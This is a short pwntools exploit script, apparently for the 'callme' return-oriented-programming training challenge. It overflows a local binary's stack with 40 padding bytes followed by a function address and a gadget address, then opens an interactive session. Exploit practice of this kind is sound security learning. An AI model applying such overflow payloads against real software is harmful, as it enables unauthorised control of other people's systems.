from pwn import*

p = process("./callme")
#gdb.attach(p, api=True)

usef = 0x00000000004008f2

use_gadgets = 0x000000000040093c
payload = b'a'*40 + p64(usef) + p64(use_gadgets)

p.sendline(payload)
p.interactive()
